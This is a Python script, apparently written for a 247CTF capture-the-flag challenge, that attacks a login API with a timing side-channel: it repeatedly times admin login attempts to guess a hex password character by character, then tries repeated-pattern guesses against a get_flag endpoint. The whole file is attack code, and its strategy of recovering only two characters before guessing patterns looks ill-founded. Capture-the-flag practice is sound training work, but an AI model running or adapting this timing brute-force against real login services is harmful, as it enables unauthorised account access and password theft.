#!/usr/bin/env python3
import requests
import time
import statistics

BASE_URL = "https://a2f2134654cc41a2.247ctf.com"
HEX_CHARS = "0123456789abcdef"

def get_token():
    resp = requests.get(f"{BASE_URL}/api/get_token", timeout=10)
    data = resp.json()
    return data["message"].split("reset to ")[1].rstrip("!")

def try_login(password, api_token):
    start = time.time()
    resp = requests.post(f"{BASE_URL}/api/login",
        data={"username": "admin", "password": password, "api": api_token},
        timeout=10)
    return resp.json(), time.time() - start

def get_flag(password):
    resp = requests.post(f"{BASE_URL}/api/get_flag",
        data={"password": password}, timeout=10)
    return resp.json()

# Estrategia: 3 mediciones por carácter para reducir ruido
# 3 × 16 = 48 requests por posición
# 128 / 48 = 2.6 posiciones
# Hacer solo 2 posiciones con alta precisión

while True:
    api_token = get_token()
    known = ""
    
    measurements = 3
    positions_to_discover = min(2, 32)
    
    for pos in range(positions_to_discover):
        all_timings = {char: [] for char in HEX_CHARS}
        
        for m in range(measurements):
            for char in HEX_CHARS:
                test_pw = known + char + "0" * (31 - len(known))
                result, elapsed = try_login(test_pw, api_token)
                all_timings[char].append(elapsed)
                
                if result.get("result") == "success":
                    flag_result = get_flag(test_pw)
                    print(flag_result.get("flag", flag_result))
                    exit(0)
        
        # Usar mediana para reducir outliers
        char_medians = {char: statistics.median(times) for char, times in all_timings.items()}
        best_char = max(char_medians.items(), key=lambda x: x[1])[0]
        known += best_char
    
    # Con 2 caracteres conocidos, ¿puedo deducir algo más?
    # Probar contraseñas donde el patrón se repite
    patterns = [
        known * 16,  # Repetir los 2 caracteres
        (known + "0" * 14) * 2,  # Mitades iguales
    ]
    
    for pattern in patterns:
        if len(pattern) == 32:
            flag_result = get_flag(pattern)
            if "flag" in str(flag_result).lower():
                print(flag_result.get("flag", flag_result))
                exit(0)
